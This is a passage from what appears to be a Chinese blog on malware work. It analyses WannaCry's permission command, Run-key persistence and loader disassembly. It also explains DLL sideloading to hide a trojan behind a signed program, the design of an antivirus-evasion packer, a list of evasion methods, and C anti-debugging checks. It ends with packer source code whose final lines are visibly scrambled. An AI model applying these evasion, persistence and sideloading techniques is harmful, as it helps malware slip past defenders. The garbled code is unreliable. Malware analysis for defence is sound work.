class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">创建隐藏文件夹</span><br><span class="line"></span><br><span class="line">![image-20231009195412748](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231009195412748.png) </span><br><span class="line"></span><br><span class="line">![image-20231009195348027](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231009195348027.png) </span><br><span class="line"></span><br><span class="line">![image-20231009195442931](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231009195442931.png) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">给文件夹权限，给了w everyone特殊权限</span><br><span class="line"></span><br><span class="line">004020E8  |.  68 FCF44000   push    0040F4FC                                         ;  ASCII &quot;icacls . /grant Everyone:F /T /C /Q&quot;</span><br><span class="line"></span><br><span class="line">![image-20231009195855402](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231009195855402.png) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">加载dll敏感函数来免杀</span><br><span class="line"></span><br><span class="line">![image-20231009195952448](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231009195952448.png) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">调用Microsoft标准加密函数</span><br><span class="line"></span><br><span class="line">![image-20231009200731756](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231009200731756.png) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">- Wannacry功能分析之（启动进程创建隐藏窗口）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">- Wannacry功能分析之（创建持久化启动）</span><br><span class="line"></span><br><span class="line">1. ```</span><br><span class="line">   reg_key:</span><br><span class="line">   HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\tymaupesi628</span><br><span class="line">   reg_value:</span><br><span class="line">   &quot;C:\Users\vbccsb\AppData\Local\Temp\tasksche.exe&quot;</span><br></pre></td></tr></table></figure>
<p><img data-src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="img"><img data-src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>Wannacry 功能分析之（加密文件后缀类型）</p>
<ol start="2">
<li>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/31919a0937aa4606898a218b9fe2ff09.png" alt="img"></p>
</li>
<li>
<p>Wannacry 功能分析之（加密文件内容算法）</p>
</li>
<li>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/61522c2f27024a4fa0dc51b70d7d6d15.png" alt="img"></p>
</li>
</ol>
<ul>
<li>Wannacry 功能分析之（查找要加密的文件）</li>
</ul>
<ol>
<li><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/4357e672afa246d897b10c4892d75bf6.png" alt="img"></li>
</ol>
<ul>
<li>Wannacry 功能分析之（DllLoader）</li>
</ul>
<ol>
<li>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/8fc91bd6a3cc477b811d026bbde0bcd6.png" alt="img"></p>
</li>
<li>
<pre><code>00402136  |.  FF75 FC       push    [local.1]
00402139  |.  50            push    eax
0040213A  |.  E8 7E000000   call    004021BD
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">   ![img](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">3. ```</span><br><span class="line">   004023EF  |&gt; \56            push    esi</span><br><span class="line">   004023F0  |.  E8 EA030000   call    004027DF</span><br><span class="line">   004023F5  |.  85C0          test    eax,eax</span><br><span class="line">   004023F7  |.  59            pop     ecx</span><br><span class="line">   004023F8  |.  74 3C         je      short 00402436</span><br><span class="line">   004023FA  |.  56            push    esi</span><br><span class="line">   004023FB  |.  E8 4B010000   call    0040254B</span><br><span class="line">   00402400  |.  85C0          test    eax,eax</span><br><span class="line">   00402402  |.  59            pop     ecx</span><br><span class="line">   00402403  |.  74 31         je      short 00402436</span><br><span class="line">   00402405  |.  56            push    esi</span><br><span class="line">   00402406  |.  E8 12030000   call    0040271D</span><br><span class="line">   0040240B  |.  85C0          test    eax,eax</span><br><span class="line">   0040240D  |.  59            pop     ecx</span><br><span class="line">   0040240E  |.  74 26         je      short 00402436</span><br><span class="line">   00402410  |.  8B06          mov     eax,dword ptr ds:[esi]</span><br><span class="line">   00402412  |.  33C9          xor     ecx,ecx</span><br><span class="line">   00402414  |.  8B40 28       mov     eax,dword ptr ds:[eax+0x28]</span><br><span class="line">   00402417  |.  3BC1          cmp     eax,ecx</span><br><span class="line">   00402419  |.  74 32         je      short 0040244D</span><br><span class="line">   0040241B  |.  394E 14       cmp     dword ptr ds:[esi+0x14],ecx</span><br><span class="line">   0040241E  |.  74 26         je      short 00402446</span><br><span class="line">   00402420  |.  51            push    ecx</span><br><span class="line">   00402421  |.  57            push    edi</span><br><span class="line">   00402422  |.  03C3          add     eax,ebx</span><br><span class="line">   00402424  |.  53            push    ebx</span><br><span class="line">   00402425  |.  FFD0          call    eax  --------------------jmp Loader</span><br></pre></td></tr></table></figure>

![img](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

 

</code></pre>
</li>
<li>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/54cd71777a994c219616249af01230a5.png" alt="img"></p>
</li>
</ol>
<ul>
<li>Wannacry 功能分析之（免杀结构）</li>
</ul>
<h2 id="白黑样本快速分析"><a class="markdownIt-Anchor" href="#白黑样本快速分析">#</a> 白 + 黑样本快速分析</h2>
<ol>
<li>利用了大公司代码的编写缺陷，比如某个应用 exe 程序，自带数字签名，他运行的时候会动态加载其目录下的 dll 文件（loadlibrary），getprocaddress 使用 dll 的扩展函数，但是 loadlibrary 的 dll 并未作验证，这样我们只要将我们编写的同名木马 dll 放到他的目录下，运行这个带有签名的 exe，让我们的木马 dll 加载到一个绝对可信空间，杀毒软件碍于性能，检验粒度不可能精确到 dll 模块，所以 exe 的绝对可信会导致杀软放行一切行为，实施攻击。</li>
<li>众所周知，数字签名是保证信息传输完整性、真实性、安全性及身份认证的一个验证方式，被广泛应用银行、电子政务及电子协议等互联网领域，但近年来却不断被不法分子所利用，成为不法分子谋取私利的工具。</li>
</ol>
<p>进程调用链，通过遍历 eprocess，遍历到进程和他的父进程</p>
<p>动态加载自身 dll，需要判断路径真实有效，数字签名是否合法</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231010174508685.png" alt="image-20231010174508685"></p>
<p>kernel32.GetNoduleFileHaneA</p>
<p>user32.GetForegroundwindow</p>
<p>user32.GetInputstate</p>
<h2 id="加壳"><a class="markdownIt-Anchor" href="#加壳">#</a> 加壳</h2>
<p>软件加壳的目的是为了防止外部程序对软件进行静态反汇编分析或者动态分析达到对软件保护的目的。壳子的种类很多，大体种类分 2 种二进制壳和指令壳，二进制壳不改变硬编码的含义，指令壳则改变了原有硬编码的含义。 本篇文章介绍二进制壳的加壳的一种思路及实现。</p>
<p>加过壳的程序在 IDA 中 Function name 都是空的，IDA 无法正常识别</p>
<p>加壳后节的区段和偏移大小也不一样</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231011221203361.png" alt="image-20231011221203361"></p>
<p>PEID 查壳原理</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231011221415342.png" alt="image-20231011221415342"></p>
<p>加过壳的程序入口变为壳的代码</p>
<p>添加壳区段，隐藏原来的区段。先跑壳代码，在执行原来的代码</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231010141450257.png" alt="image-20231010141450257"></p>
<h4 id="恶意软件免杀壳"><a class="markdownIt-Anchor" href="#恶意软件免杀壳">#</a> 恶意软件免杀壳</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">经过10多年的发展，反病毒引擎已经在误报&amp;查毒粒度之间取了一个比较好的平衡，常规的免杀技术（特征码免杀、源码免杀）处理成本越来越高。不过反病毒引擎天然存在某些&quot;缺陷&quot;，例如正常软件会加商业保护壳，导致会受到商业壳的制约，无法将所有壳标记为病毒。</span><br><span class="line"></span><br><span class="line">由于内存执行&quot;被加壳程序&quot;是壳的基础行为，而内存执行PE这个&quot;壳的基础行为&quot;可以很好的将&quot;被加壳程序&quot;的特征码隐藏起来。因此编写一款无特征码壳是一个非常好的反杀软查杀(特征码、启发式)的方案。</span><br><span class="line"></span><br><span class="line">模拟正常PE程序结构, 模拟正常PE程序结构, 模拟正常PE程序结构</span><br><span class="line"></span><br><span class="line">特征代码最小化，并且被查杀后可通过混淆引擎来混淆壳代码，达到快速变种、快速免杀的效果。</span><br><span class="line"></span><br><span class="line">笔者不建议进行任何可能提高程序熵值的操作，尽可能将壳程序的PE格式、数据结构、代码执行顺序与正常程序保持一致。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">这个免杀壳的代码主要分为三部分：</span><br><span class="line"></span><br><span class="line">加壳器：这部分代码用来将被加壳程序、傀儡程序、壳代码拼装处理，组合生成一个免杀的PE文件。</span><br><span class="line"></span><br><span class="line">CodeLoader（壳代码）：这部分代码用来反杀毒引擎、内存加载执行PeLoader，需要编译为Shellcode代码。</span><br><span class="line"></span><br><span class="line">PeLoader（壳代码）：这部分代码用来内存执行Shelled（被加壳程序），需要编译为Shellcode代码。</span><br></pre></td></tr></table></figure>
<p>特征码免杀法：最基本的免杀技术</p>
<p>通用免杀法：替换资源、增加签名、加冷门壳、加多重壳</p>
<p>源码免杀法：当前主流免杀技术，需要有源代码才能操作。通过修改病毒的特征字符串、动态 API 调用、修改编译环境、套程序外壳 (MFC、SDK、QT) 等</p>
<p>输入表 (IAT) 免杀法：启发式引擎会扫描目标程序的输入表中是否含指定的函数特征序列 (函数调用特征码)。</p>
<p>代码混淆、加花：通过对特征代码进行膨胀、乱序来干扰启发式引擎的分析，以及提升人工提取特征码的难度。</p>
<p>入口点模糊技术：参考 &quot;主要技术&quot; 目录下的 &quot;入口点模糊技术&quot;</p>
<p>内存加载执行 PE 文件：壳的基本技术，论坛资料很多。</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231011230004404.png" alt="image-20231011230004404"></p>
<h4 id="反调试原理"><a class="markdownIt-Anchor" href="#反调试原理">#</a> 反调试原理</h4>
<p>使用 Windows API<br>
 使用 Windows API 函数检测调试器是否存在是最简单的反调试技术。Windows 操作系统中提供了这样一些 API，应用程序可以通过调用这些 API，来检测自己是否正在被调试。这些 API 中有些是专门用来检测调试器的存在的，而另外一些 API 是出于其他目的而设计的，但也可以被改造用来探测调试器的存在。其中很小部分 API 函数没有在微软官方文档显示。通常，防止恶意代码使用 API 进行反调试的最简单的办法是在恶意代码运行期间修改恶意代码，使其不能调用探测调试器的 API 函数，或者修改这些 API 函数的返回值，确保恶意代码执行合适的路径。与这些方法相比，较复杂的做法是挂钩这些函数，如使用 rootkit 技术。<br>
1.1IsDebuggerPresent<br>
IsDebuggerPresent 查询进程环境块 (PEB) 中的 IsDebugged 标志。如果进程没有运行在调试器环境中，函数返回 0；如果调试附加了进程，函数返回一个非零值。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">1.1IsDebuggerPresent</span><br><span class="line">IsDebuggerPresent查询进程环境块(PEB)中的IsDebugged标志。如果进程没有运行在调试器环境中，函数返回0；如果调试附加了进程，函数返回一个非零值。</span><br><span class="line">BOOL CheckDebug()</span><br><span class="line">&#123;</span><br><span class="line">   return IsDebuggerPresent();</span><br><span class="line">&#125;</span><br><span class="line">1.2CheckRemoteDebuggerPresent</span><br><span class="line">CheckRemoteDebuggerPresent同IsDebuggerPresent几乎一致。它不仅可以探测系统其他进程是否被调试，通过传递自身进程句柄还可以探测自身是否被调试。</span><br><span class="line">BOOL CheckDebug()</span><br><span class="line">&#123;</span><br><span class="line">   BOOL ret;</span><br><span class="line">   CheckRemoteDebuggerPresent(GetCurrentProcess(), &amp;ret);</span><br><span class="line">   return ret;</span><br><span class="line">&#125;</span><br><span class="line">1.3NtQueryInformationProcess</span><br><span class="line">这个函数是Ntdll.dll中一个原生态API，它用来提取一个给定进程的信息。它的第一个参数是进程句柄，第二个参数告诉我们它需要提取进程信息的类型。为第二个参数指定特定值并调用该函数，相关信息就会设置到第三个参数。第二个参数是一个枚举类型，其中与反调试有关的成员有ProcessDebugPort(0x7)、ProcessDebugObjectHandle(0x1E)和ProcessDebugFlags(0x1F)。例如将该参数置为ProcessDebugPort，如果进程正在被调试，则返回调试端口，否则返回0。</span><br><span class="line"></span><br><span class="line">BOOL CheckDebug()</span><br><span class="line">&#123;</span><br><span class="line">   int debugPort = 0;</span><br><span class="line">   HMODULE hModule = LoadLibrary(&quot;Ntdll.dll&quot;);</span><br><span class="line">   NtQueryInformationProcessPtr NtQueryInformationProcess = (NtQueryInformationProcessPtr)GetProcAddress(hModule, &quot;NtQueryInformationProcess&quot;);</span><br><span class="line">   NtQueryInformationProcess(GetCurrentProcess(), 0x7, &amp;debugPort, sizeof(debugPort), NULL);</span><br><span class="line">   return debugPort != 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL CheckDebug()</span><br><span class="line">&#123;</span><br><span class="line">   HANDLE hdebugObject = NULL;</span><br><span class="line">   HMODULE hModule = LoadLibrary(&quot;Ntdll.dll&quot;);</span><br><span class="line">   NtQueryInformationProcessPtr NtQueryInformationProcess = (NtQueryInformationProcessPtr)GetProcAddress(hModule, &quot;NtQueryInformationProcess&quot;);</span><br><span class="line">   NtQueryInformationProcess(GetCurrentProcess(), 0x1E, &amp;hdebugObject, sizeof(hdebugObject), NULL);</span><br><span class="line">   return hdebugObject != NULL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL CheckDebug()</span><br><span class="line">&#123;</span><br><span class="line">   BOOL bdebugFlag = TRUE;</span><br><span class="line">   HMODULE hModule = LoadLibrary(&quot;Ntdll.dll&quot;);</span><br><span class="line">   NtQueryInformationProcessPtr NtQueryInformationProcess = (NtQueryInformationProcessPtr)GetProcAddress(hModule, &quot;NtQueryInformationProcess&quot;);</span><br><span class="line">   NtQueryInformationProcess(GetCurrentProcess(), 0x1E, &amp;bdebugFlag, sizeof(bdebugFlag), NULL);</span><br><span class="line">   return bdebugFlag != TRUE;</span><br><span class="line">&#125;</span><br><span class="line">1.4GetLastError</span><br><span class="line">编写应用程序时，经常需要涉及到错误处理问题。许多函数调用只用TRUE和FALSE来表明函数的运行结果。一旦出现错误，MSDN中往往会指出请用GetLastError()函数来获得错误原因。恶意代码可以使用异常来破坏或者探测调试器。调试器捕获异常后，并不会立即将处理权返回被调试进程处理，大多数利用异常的反调试技术往往据此来检测调试器。多数调试器默认的设置是捕获异常后不将异常传递给应用程序。如果调试器不能将异常结果正确返回到被调试进程，那么这种异常失效可以被进程内部的异常处理机制探测。</span><br><span class="line">对于OutputDebugString函数，它的作用是在调试器中显示一个字符串，同时它也可以用来探测调试器的存在。使用SetLastError函数，将当前的错误码设置为一个任意值。如果进程没有被调试器附加，调用OutputDebugString函数会失败，错误码会重新设置，因此GetLastError获取的错误码应该不是我们设置的任意值。但如果进程被调试器附加，调用OutputDebugString函数会成功，这时GetLastError获取的错误码应该没改变。</span><br><span class="line">BOOL CheckDebug()</span><br><span class="line">&#123;</span><br><span class="line">   DWORD errorValue = 12345;</span><br><span class="line">   SetLastError(errorValue);</span><br><span class="line">   OutputDebugString(&quot;Test for debugger!&quot;);</span><br><span class="line">   if (GetLastError() == errorValue)</span><br><span class="line">   &#123;</span><br><span class="line">     return TRUE;</span><br><span class="line">   &#125;</span><br><span class="line">   else</span><br><span class="line">   &#123;</span><br><span class="line">     return FALSE;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line">对于DeleteFiber函数，如果给它传递一个无效的参数的话会抛出ERROR_INVALID_PARAMETER异常。如果进程正在被调试的话，异常会被调试器捕获。所以，同样可以通过验证LastError值来检测调试器的存在。如代码所示，0x57就是指ERROR_INVALID_PARAMETER。</span><br><span class="line"></span><br><span class="line">BOOL CheckDebug()</span><br><span class="line">&#123;</span><br><span class="line">   char fib[1024] = &#123;0&#125;;</span><br><span class="line">   DeleteFiber(fib);</span><br><span class="line">   return (GetLastError() != 0x57);</span><br><span class="line">&#125;</span><br><span class="line">同样还可以使用CloseHandle、CloseWindow产生异常，使得错误码改变。</span><br><span class="line"></span><br><span class="line">BOOL CheckDebug()</span><br><span class="line">&#123;</span><br><span class="line">   DWORD ret = CloseHandle((HANDLE)0x1234);</span><br><span class="line">   if (ret != 0 || GetLastError() != ERROR_INVALID_HANDLE)</span><br><span class="line">   &#123;</span><br><span class="line">     return TRUE;</span><br><span class="line">   &#125;</span><br><span class="line">   else</span><br><span class="line">   &#123;</span><br><span class="line">     return FALSE;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL CheckDebug()</span><br><span class="line">&#123;</span><br><span class="line">   DWORD ret = CloseWindow((HWND)0x1234);</span><br><span class="line">   if (ret != 0 || GetLastError() != ERROR_INVALID_WINDOW_HANDLE)</span><br><span class="line">   &#123;</span><br><span class="line">     return TRUE;</span><br><span class="line">   &#125;</span><br><span class="line">   else</span><br><span class="line">   &#123;</span><br><span class="line">     return FALSE;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line">1.5ZwSetInformationThread</span><br><span class="line">ZwSetInformationThread拥有两个参数，第一个参数用来接收当前线程的句柄，第二个参数表示线程信息类型，若其值设置为ThreadHideFromDebugger(0x11)，使用语句ZwSetInformationThread(GetCurrentThread(), ThreadHideFromDebugger, NULL, 0);调用该函数后，调试进程就会被分离出来。该函数不会对正常运行的程序产生任何影响，但若运行的是调试器程序，因为该函数隐藏了当前线程，调试器无法再收到该线程的调试事件，最终停止调试。还有一个函数DebugActiveProcessStop用来分离调试器和被调试进程，从而停止调试。两个API容易混淆，需要牢记它们的区别。</span><br></pre></td></tr></table></figure>
<h3 id="手工加壳原理"><a class="markdownIt-Anchor" href="#手工加壳原理">#</a> 手工加壳原理</h3>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231012152019892.png" alt="image-20231012152019892"></p>
<p>我们向 PE 文件添加一个区段并将其设置为入口点，这样 PE 文件最开始执行的命令就是我们添加的区段也就是壳的指令，壳对加密区进行解密，对压缩区进行解压，将原本的 EXE 文件还原出来，然后跳转至原程序入口，程序照常运行。</p>
<ul>
<li><em><strong>* 恶意软件加壳工具开发原理 *</strong></em></li>
</ul>
<ol>
<li>
<p>demo.exe 代表是被加壳的源程序。</p>
</li>
<li>
<p>Shell.exe 代表的是壳子程序。</p>
</li>
<li>
<p>Packed.exe 代表的是加壳程序。</p>
</li>
<li>
<figure class="highlight cpp"><figcaption data-lang="C++"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;Windows.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;cstdio></span></span></pre></td></tr><tr><td data-num="3"></td><td><pre> </pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">SHELL_FILE_NAME</span> <span class="token string">"Shell.exe"</span>   <span class="token comment">// 壳子名</span></span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">ORGIN_FILE_NAME</span> <span class="token string">"demo.exe"</span>    <span class="token comment">// 要被加壳的程序名称</span></span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">TARGET_FILE_NAME</span> <span class="token string">"target.exe"</span> <span class="token comment">// 生成的文件名</span></span></pre></td></tr><tr><td data-num="7"></td><td><pre> </pre></td></tr><tr><td data-num="8"></td><td><pre> </pre></td></tr><tr><td data-num="9"></td><td><pre>BOOL <span class="token function">PackFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 将要加壳的程序加密以后加入壳子中</span></pre></td></tr><tr><td data-num="10"></td><td><pre>VOID <span class="token function">EncpyptFile</span><span class="token punctuation">(</span>PUCHAR pBaseAddr<span class="token punctuation">,</span> DWORD dwFileSize<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 对文件内容进行加密</span></pre></td></tr><tr><td data-num="11"></td><td><pre>BOOL <span class="token function">AddSection</span><span class="token punctuation">(</span>PVOID pShellBase<span class="token punctuation">,</span> PVOID pOrgBase<span class="token punctuation">,</span> DWORD dwShellFileSize<span class="token punctuation">,</span> DWORD dwOrgFileSize<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 将源文件加到壳子中</span></pre></td></tr><tr><td data-num="12"></td><td><pre>VOID <span class="token function">ShowError</span><span class="token punctuation">(</span>PCHAR msg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 弹出错误信息</span></pre></td></tr><tr><td data-num="13"></td><td><pre>DWORD <span class="token function">Align</span><span class="token punctuation">(</span>DWORD dwSize<span class="token punctuation">,</span> DWORD dwAlign<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 用于对齐，返回对齐以后的数字</span></pre></td></tr><tr><td data-num="14"></td><td><pre> </pre></td></tr><tr><td data-num="15"></td><td><pre> </pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token keyword">int</span> APIENTRY <span class="token function">wWinMain</span><span class="token punctuation">(</span>_In_ HINSTANCE hInstance<span class="token punctuation">,</span></pre></td></tr><tr><td data-num="17"></td><td><pre>                     _In_opt_ HINSTANCE hPrevInstance<span class="token punctuation">,</span></pre></td></tr><tr><td data-num="18"></td><td><pre>                     _In_ LPWSTR    lpCmdLine<span class="token punctuation">,</span></pre></td></tr><tr><td data-num="19"></td><td><pre>                     _In_ <span class="token keyword">int</span>       nCmdShow<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">PackFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>        <span class="token function">MessageBox</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token function">TEXT</span><span class="token punctuation">(</span><span class="token string">"加壳成功"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">TEXT</span><span class="token punctuation">(</span><span class="token string">"成功"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> MB_OK<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="25"></td><td><pre> </pre></td></tr><tr><td data-num="26"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="27"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="28"></td><td><pre> </pre></td></tr><tr><td data-num="29"></td><td><pre>BOOL <span class="token function">PackFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="30"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>    BOOL bRet <span class="token operator">=</span> TRUE<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>    HANDLE hOrgFile <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> hShellFile <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="33"></td><td><pre>    DWORD dwOrgFileSize <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> dwShellFileSize <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> dwRet <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> dwFileSize <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="34"></td><td><pre>    PVOID pOrgBase <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> pShellBase <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="35"></td><td><pre> </pre></td></tr><tr><td data-num="36"></td><td><pre>    hOrgFile <span class="token operator">=</span> CrLE_NAME<span class="token punctuation">,</span> </pre></td></tr><tr><td data-num="37"></td><td><pre>                          <span class="token function">GENERIC_eateFile</span><span class="token punctuation">(</span>ORGIN_FIREAD<span class="token punctuation">,</span> 